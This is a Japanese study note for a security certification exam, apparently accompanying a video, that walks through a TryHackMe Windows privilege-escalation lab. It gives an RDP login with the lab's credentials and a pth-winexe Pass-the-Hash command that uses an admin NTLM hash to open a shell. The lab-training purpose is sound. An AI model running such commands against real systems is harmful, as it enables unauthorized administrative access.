## 【支援士.exe #1】Pass the Hash / NTLM
### 動画
[【支援士.exe #1】 Pass the HashをNTLM認証に試してみる #tryhackme](https://youtu.be/qJbJejgqokE?si=dSORszdvt1bO3bKA)

### 支援士のキーワード
「Pass the Hash攻撃」<br>
令和７年 秋期 情報処理安全確保支援士試験 午前Ⅱ 問２


### 学習環境
TryHackMe / Windows PrivEsc（Windows 特権昇格）/ Task12<br>
[https://tryhackme.com/room/windows10privesc](https://tryhackme.com/room/windows10privesc)

### 必要なもの
- TryHackMeアカウント（Premium）
<br>

## 実行するコマンド
※`<targetIP>`は起動したマシンのIPアドレスに変更してください

#### 【Task1】脆弱なWindowsにRDP接続
```
# 脆弱なWindowsにRDP接続する<br>
xfreerdp /u:user /p:password321 /cert:ignore /v:<targetIP>

# ユーザを確認
whoami
```

#### 【Task12】Pass the Hash攻撃を実行
```
# Pass the Hash攻撃を実行する
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //<targetIP> cmd.exe

# ユーザを確認<br>
whoami
```
